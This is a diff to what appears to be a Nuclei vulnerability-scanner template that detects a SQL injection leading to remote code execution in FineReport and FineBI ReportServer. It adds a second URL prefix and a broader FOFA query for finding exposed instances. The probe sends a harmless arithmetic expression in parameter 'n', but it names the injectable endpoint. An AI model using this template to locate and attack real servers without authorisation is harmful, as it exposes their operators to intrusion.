@@ -1,18 +1,18 @@
 id: finereport-sqli-rce
 
 info:
-  name: FineReport SQLi - Remote Code Execution
+  name: 帆软 FineReport SQL注入导致远程命令执行
   author: adeljck
   severity: critical
   description: |
-    Access URL:/webroot/decision/view/ReportServer?test=&n=, which can execute the SQL statement in GET parameter n. This vulnerability is caused by Fanruan's own sqlite-jdbc-x.x.x.x.jar driver.
+    帆软 FineReport / FineBI ReportServer 参数 n 可执行 SQL，sqlite-jdbc 驱动可被滥用导致远程代码执行。部分站点部署在 /decision，不含 /webroot。
   reference:
     - https://github.com/wy876/POC/blob/main/%E5%B8%86%E8%BD%AF%E7%B3%BB%E7%BB%9FReportServer%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4RCE.md
   metadata:
-    max-request: 1
+    max-request: 2
     verified: true
-    fofa-query: app="帆软-FineReport"
-  tags: finereport,rce,sqli,vuln
+    fofa-query: app="帆软-FineReport" || title="FineBI"
+  tags: finereport,finebi,rce,sqli,vuln
 
 variables:
   string: '{{rand_base(8, "abc")}}'
@@ -20,9 +20,15 @@ variables:
 http:
   - raw:
       - |
-        GET /webroot/decision/view/ReportServer?{{string}}=&n=${sum(1024,123)} HTTP/1.1
+        GET {{base}}/view/ReportServer?{{string}}=&n=${sum(1024,123)} HTTP/1.1
         Host: {{Hostname}}
         Content-Type: application/x-www-form-urlencoded
+
+    payloads:
+      base:
+        - "/webroot/decision"
+        - "/decision"
+    stop-at-first-match: true
 
     matchers-condition: and
     matchers:
@@ -35,4 +41,3 @@ http:
         status:
           - 200
           - 302
-# digest: 4a0a00473045022013dbf8f79338275175048d93ef7f04ec0241a28db29709b5f1aa241375632fb60221009edd8dd21a336cf7ae3d7a45ca7acbb502f924090cd53c8b28e32c9c105d12e6:922c64590222798bb761d5b6d8e72950
